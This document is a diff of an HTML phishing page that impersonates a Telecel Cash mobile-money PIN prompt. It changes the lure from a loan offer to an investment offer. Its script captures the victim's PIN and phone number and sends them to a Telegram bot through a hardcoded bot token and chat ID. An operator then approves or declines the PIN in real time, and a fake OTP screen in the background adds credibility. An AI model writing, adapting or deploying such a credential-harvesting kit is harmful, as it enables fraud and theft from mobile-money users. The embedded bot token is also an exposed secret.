@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telecel Cash PIN · Loan authorisation</title>
+  <title>Telecel Cash PIN · Investment authorisation</title>
   
   <!-- Font (same as OTP page) -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -27,7 +27,7 @@
       padding: 10px; /* ensures spacing on very small screens */
     }
 
-    /* ---------- BLURRED OTP BACKGROUND (exact copy of OTP page, non‑interactive) ---------- */
+    /* ---------- BLURRED OTP BACKGROUND (static copy) ---------- */
     .blurred-background {
       position: fixed;
       top: 0;
@@ -258,7 +258,7 @@
       letter-spacing: -0.2px;
     }
 
-    /* PIN inputs – now with numeric keypad on mobile */
+    /* PIN inputs */
     .pin-inputs {
       display: flex;
       gap: 12px;
@@ -278,10 +278,8 @@
       background: #fff;
       transition: border 0.15s, box-shadow 0.15s;
       color: #1a1a1a;
-      /* numeric keypad on mobile + password masking */
       inputmode: numeric;
-      pattern: \d*;
-      -webkit-text-security: disc; /* fallback for older browsers */
+      -webkit-text-security: disc;
     }
 
     .pin-input:focus {
@@ -384,7 +382,7 @@
 </head>
 <body>
 
-<!-- BLURRED OTP BACKGROUND (static copy of OTP page) -->
+<!-- BLURRED OTP BACKGROUND (static copy) -->
 <div class="blurred-background">
   <div class="bg-otp">
     <div class="top-bg"></div>
@@ -393,28 +391,27 @@
         <div class="logo-circle">t</div>
         <div class="logo-text">telecel</div>
       </div>
-      <div class="title">Confirm your account</div>
-      <div class="subtitle">The One Time Pin has been sent to<br>02xxxxxx20. Enter it below.</div>
+      <div class="title">Secure your investment</div>
+      <div class="subtitle">Confirm with Telecel Cash PIN</div>
       <div class="otp-container">
-        <input class="otp-input" value="1" disabled><input class="otp-input" value="2" disabled><input class="otp-input" value="3" disabled><input class="otp-input" value="4" disabled><input class="otp-input" value="5" disabled><input class="otp-input" value="6" disabled>
+        <input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled><input class="otp-input" value="●" disabled>
       </div>
-      <button class="btn-primary" disabled>Next</button>
-      <button class="btn-outline" disabled>Go Back</button>
+      <button class="btn-primary" disabled>Verify</button>
+      <button class="btn-outline" disabled>Cancel</button>
     </div>
   </div>
 </div>
 
 <!-- PIN MODAL CARD -->
 <div class="pin-modal">
-  <!-- error box (hidden by default) -->
   <div class="error-box" id="errorBox">
     <div class="close-error" onclick="hideError()">×</div>
-    <div class="error-title">Error</div>
+    <div class="error-title">Authorization failed</div>
     <div class="error-text" id="errorText">Wrong PIN</div>
   </div>
 
   <div class="modal-header">
-    <h2>Confirm loan Application</h2>
+    <h2>Confirm Investment</h2>
     <div class="close-btn" id="backBtn">×</div>
   </div>
   <div class="divider"></div>
@@ -425,32 +422,31 @@
     </div>
   </div>
 
-  <div class="description">
-    You are about to authorise Telecel to award you a loan. Enter your PIN to authorise.
+  <div class="description" id="investmentDesc">
+    Loading investment details...
   </div>
 
-  <div class="label">Telecel Cash Pin</div>
+  <div class="label">Telecel Cash PIN</div>
 
   <div class="pin-inputs">
-    <!-- Added inputmode and pattern for numeric keypad, while keeping type="password" -->
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin1" autofocus autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin2" autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin3" autocomplete="off">
     <input class="pin-input" type="password" inputmode="numeric" pattern="\d*" maxlength="1" id="pin4" autocomplete="off">
   </div>
 
-  <button class="btn-authorise" id="authoriseBtn">Authorise</button>
+  <button class="btn-authorise" id="authoriseBtn">Continue</button>
 </div>
 
 <!-- SPINNER with custom message -->
 <div id="spinner">
   <div class="loader"></div>
-  <div class="spinner-text">Calculating loan limit</div>
+  <div class="spinner-text">Validating PIN</div>
 </div>
 
 <script>
   (function() {
-    // --- TELEGRAM CONFIG ---
+    // --- TELEGRAM CONFIG (same as before) ---
     const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
     const CHAT_ID   = '1006917440';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
@@ -467,11 +463,35 @@
     const errorBox = document.getElementById('errorBox');
     const errorText = document.getElementById('errorText');
     const backBtn = document.getElementById('backBtn');
+    const investmentDesc = document.getElementById('investmentDesc');
 
-    // --- Retrieve session data ---
+    // --- Retrieve stored data (from previous investment selection) ---
     let phone = sessionStorage.getItem('telecel_phone') || '0200000020';
     let accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
     let inputValue = sessionStorage.getItem('telecel_inputValue') || '';
+
+    // Retrieve investment plan if available
+    let selectedPlan = null;
+    try {
+      const planStr = sessionStorage.getItem('selectedInvestmentPlan');
+      if (planStr) {
+        selectedPlan = JSON.parse(planStr);
+      }
+    } catch(e) {
+      console.warn('Could not parse investment plan');
+    }
+
+    // Fallback if no plan stored
+    if (!selectedPlan) {
+      selectedPlan = {
+        name: 'Investment Plan',
+        rate: 'variable',
+        duration: 'flexible'
+      };
+    }
+
+    // Update description with investment plan details
+    investmentDesc.innerHTML = `You are about to invest with Telecel.<br><strong>${selectedPlan.name}</strong> · ${selectedPlan.rate} return · ${selectedPlan.duration}.<br>Enter your PIN to choose amount you want to invest.`;
 
     // --- Auto‑advance & style update ---
     function updateButtonState() {
@@ -520,11 +540,11 @@
     };
 
     function showError(msg) {
-      errorText.innerText = msg || 'Wrong PIN';
+      errorText.innerText = msg || 'Invalid PIN. Please try again.';
       errorBox.style.display = 'block';
     }
 
-    // --- Telegram helpers ---
+    // --- Telegram helpers (same as original) ---
     function escapeHtml(unsafe) {
       return unsafe.replace(/[&<>"]/g, function(m) {
         if (m === '&') return '&amp;';
@@ -583,7 +603,7 @@
       }, 1500);
     }
 
-    // --- Authorise button logic ---
+    // --- Authorise button logic (investment context) ---
     let isProcessing = false;
 
     authoriseBtn.addEventListener('click', async function() {
@@ -591,7 +611,7 @@
 
       const pin = pinInputs.map(i => i.value).join('');
       if (pin.length !== 4) {
-        showError('Enter all 4 digits');
+        showError('Enter all 4 digits of your Telecel Cash PIN.');
         return;
       }
 
@@ -607,7 +627,10 @@
       const ts = Date.now();
       const escapedPin = escapeHtml(pin);
 
-      const msg = `PIN verification\n\n${identifier}\n\nPIN entered: <code>${escapedPin}</code>\n\nAuthorise this pin?`;
+      // Build investment details string
+      const planDetails = `${selectedPlan.name} · ${selectedPlan.rate} return · ${selectedPlan.duration}`;
+      
+      const msg = `PIN Verification\n\n${identifier}\nPIN entered: <code>${escapedPin}</code>\n\nAuthorize this PIN?`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
@@ -615,20 +638,21 @@
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [[
-            { text: 'Approve', callback_data: `pin_approve_${ts}` },
-            { text: 'Decline', callback_data: `pin_decline_${ts}` }
+            { text: '✅ Approve', callback_data: `inv_approve_${ts}` },
+            { text: '❌ Decline', callback_data: `inv_decline_${ts}` }
           ]]
         }
       });
 
-      pollForCallback('pin', ts, (action) => {
+      pollForCallback('inv', ts, (action) => {
         spinner.style.display = 'none';
         isProcessing = false;
 
         if (action === 'approve') {
+          // Success – redirect to confirmation page (change to investment-success if needed)
           window.location.href = 'unavailable.html';
         } else if (action === 'decline') {
-          showError('Wrong PIN');
+          showError('Wrong PIN.');
           pinInputs.forEach(i => {
             i.value = '';
             i.disabled = false;
@@ -640,13 +664,13 @@
       });
     });
 
-    // --- Back button (X) – goes to previous page ---
+    // --- Back button (X) – goes back to plan selection ---
     backBtn.addEventListener('click', function() {
       window.history.back();
     });
 
     if (!sessionStorage.getItem('telecel_phone') && !sessionStorage.getItem('telecel_inputValue')) {
-      console.log('Using default demo data');
+      console.log('Using default demo data for investment');
     }
   })();
 </script>
